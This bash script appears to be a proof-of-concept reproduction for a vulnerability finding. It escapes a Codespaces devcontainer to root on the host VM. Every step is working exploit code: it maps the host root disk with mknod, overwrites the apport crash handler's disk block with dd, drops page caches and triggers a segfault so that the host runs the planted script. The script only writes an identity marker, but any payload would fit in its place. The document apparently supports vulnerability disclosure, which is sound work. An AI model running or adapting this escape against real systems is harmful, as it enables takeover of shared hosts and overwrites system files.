#!/bin/bash
# F-003 reproduction: Codespaces devcontainer -> host VM root code execution
# Run inside any codespace as:  bash repro-f003.sh
# (kept in-repo so the web-terminal needs no multi-line paste)

echo "[*] F-003 repro start: $(date -u +%FT%TZ)"

# 1) locate the VM root disk (device ordering varies per boot)
D=""
for spec in 8:1 8:17 8:33 8:2 8:34; do
  maj=${spec%%:*}; min=${spec##*:}
  sudo rm -f /dev/rt
  sudo mknod /dev/rt b "$maj" "$min" 2>/dev/null
  if sudo blkid /dev/rt 2>/dev/null | grep -q cloudimg-rootfs; then D=/dev/rt; break; fi
done
if [ -z "$D" ]; then echo "[!] NO-ROOT-DISK. Output of ls /sys/class/block:"; ls /sys/class/block; exit 1; fi
echo "[+] FOUND-ROOT-DISK=$D"

# 2) identity-reporting payload
cat > /tmp/apx2 <<'PEOF'
#!/bin/sh
{ echo "HANDLER-EXEC $(date -u +%FT%TZ)"; echo "argv: $@";
  echo "uid=$(id -u) gid=$(id -g)";
  echo "pidns: $(readlink /proc/self/ns/pid)"; echo "mntns: $(readlink /proc/self/ns/mnt)";
  echo "cgroup: $(cat /proc/self/cgroup 2>/dev/null)";
  echo "ppid: $PPID comm: $(cat /proc/$PPID/comm 2>/dev/null)";
} > /HOST-PWNED-CORE 2>/dev/null; exit 0
PEOF
SZ=$(wc -c < /tmp/apx2)
echo "[+] payload written: $SZ bytes"
if [ "$SZ" -lt 300 ] || [ "$SZ" -gt 380 ]; then echo "[!] payload size unexpected, aborting"; exit 1; fi

# 3) overwrite the host crash handler's first block in place
B=$(sudo debugfs -R "blocks /usr/share/apport/apport" $D 2>/dev/null | grep -oE "[0-9]+" | head -1)
if [ -z "$B" ]; then echo "[!] apport block not found on $D"; exit 1; fi
echo "[+] apport first block: $B"
sudo dd if=/tmp/apx2 of=$D bs=4096 seek=$B conv=notrunc count=1 2>&1 | tail -1
echo "[+] on-disk check (first line should be #!/bin/sh):"
sudo debugfs -R "cat /usr/share/apport/apport" $D 2>/dev/null | head -1

# 4) evict host page cache so the handler is read from disk
sudo sh -c 'echo 3 > /proc/sys/vm/drop_caches' && echo "[+] CACHES-DROPPED"

# 5) container identity, for contrast with the marker
echo "[+] container pidns: $(readlink /proc/self/ns/pid)  cgroup: $(cat /proc/self/cgroup)"

# 6) remove any stale marker, then TRIGGER
sudo debugfs -w -R "rm /HOST-PWNED-CORE" $D >/dev/null 2>&1
sudo sh -c 'ulimit -c unlimited; kill -SEGV $$' 2>/dev/null
echo "[+] segfault sent; waiting for journal commit..."

# 7) read the marker (retry for journal lag)
for i in 1 2 3 4 5 6; do
  sleep 10
  M=$(sudo debugfs -R "cat /HOST-PWNED-CORE" $D 2>/dev/null)
  [ -n "$M" ] && break
done
echo "===== MARKER ON HOST DISK ====="
if [ -n "$M" ]; then echo "$M"; echo "===== VM ESCAPE REPRODUCED (uid=0, host init ns) ====="; else echo "[!] marker not found"; fi
